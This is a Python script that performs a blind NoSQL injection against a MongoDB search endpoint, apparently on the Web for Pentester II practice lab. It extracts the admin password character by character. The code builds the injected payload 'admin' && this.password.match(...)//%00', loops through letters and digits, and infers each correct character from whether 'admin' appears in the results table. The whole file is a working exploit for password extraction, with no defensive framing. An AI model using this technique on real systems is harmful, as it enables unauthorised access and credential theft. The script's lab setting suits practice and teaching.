import requests, sys, string
from bs4 import BeautifulSoup

wfp2_site = sys.argv[1]

url = f'''http://{wfp2_site}/mongodb/example2/?search='''
alpha_numeric = string.ascii_letters + string.digits

# Pseudo-code for list:
# 1) Loop through every letter in alpha_numeric
# 2) Inject every letter for every loop,
#   2a) If 'admin' found, then letter is valid
#       * break out of loop
#       * include that in the URL
# 3) Check against a regex [a-zA-Z0-9] to check if password is completed
# Repeat steps 1-3 until checking regex [a-zA-Z0-9] returns 'admin not found'


def get_request(url_to_connect):
    """
    Send a get request to the server and receive a response back

    :param url_to_connect: (string) a link to connect to a sever
    :return: a BeautifulSoup object
    """
    resp = requests.get(url_to_connect)
    soup = BeautifulSoup(resp.text, 'html.parser')
    return soup


def check_user(user, soup_object):
    """
    To check if user exists in the table in the soup object
    :param user: (string) name of user
    :param soup_object: (object) soup object that contains table
    :return: True if user is found in table, False if not found in table
    """

    if user in soup_object.find('table').getText():
        return True
    else:
        return False


pwd = ''
search_string = "admin' %26%26 this.password.match(/^{}{}/)//%00"
is_completed = "admin' %26%26 this.password.match(/^{}[a-zA-Z0-9]/)//%00"
done = False


while not done:
    for i in alpha_numeric:
        soup = get_request(url + search_string.format(pwd, i))
        if check_user('admin', soup):
            print(url + search_string.format(pwd, i) + " Matched!")
            pwd += i
            print('Current pass: ', pwd)
            break
        else:
            print(url + search_string.format(pwd, i) + " No match")

    # check to see if password is completed
    soup = get_request(url + is_completed.format(pwd))
    if not check_user('admin', soup):
        print('Complete pass: ', pwd)
        done = True
